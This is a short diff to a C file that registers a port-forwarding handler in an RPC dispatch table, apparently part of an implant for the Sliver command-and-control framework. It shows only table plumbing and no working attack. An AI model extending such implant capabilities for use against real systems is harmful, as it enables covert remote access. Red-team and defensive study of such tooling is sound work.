@@ -325,6 +325,7 @@ static const rpc_entry_t g_handlers[] = {
     {SLIVER_MSG_TUNNEL_DATA, 0, sliver_rpc_handle_tunnel_data},
     {SLIVER_MSG_TUNNEL_CLOSE, 0, sliver_rpc_handle_tunnel_close},
     {SLIVER_MSG_SHELL_RESIZE_REQ, 0, sliver_rpc_handle_shell_resize},
+    {SLIVER_MSG_PORTFWD_REQ, SLIVER_MSG_PORTFWD, sliver_rpc_handle_portfwd},
 };
 
 void sliver_rpc_result_free(sliver_rpc_result_t *result) {
@@ -373,6 +374,7 @@ void sliver_rpc_dispatch(const sliver_envelope_t *req, sliver_rpc_result_t *resu
     return;
   }
 }
+
 
 
 
